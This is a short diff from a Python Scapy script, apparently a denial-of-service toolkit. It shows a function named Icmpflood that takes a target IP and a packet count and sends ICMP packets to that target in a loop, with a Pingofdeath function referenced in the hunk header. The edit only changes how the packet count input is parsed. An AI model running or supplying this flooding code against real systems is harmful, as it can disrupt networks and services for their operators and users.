@@ -73,7 +73,7 @@ def Pingofdeath():
 
 def Icmpflood():
     targetip = raw_input("Target IP: ")
-    cycle = raw_input("Number of packets: ")
+    cycle = int(input("Number of packets: "))
 
     for x in range (0,int(cycle)):
         send(IP(dst=targetip)/ICMP())
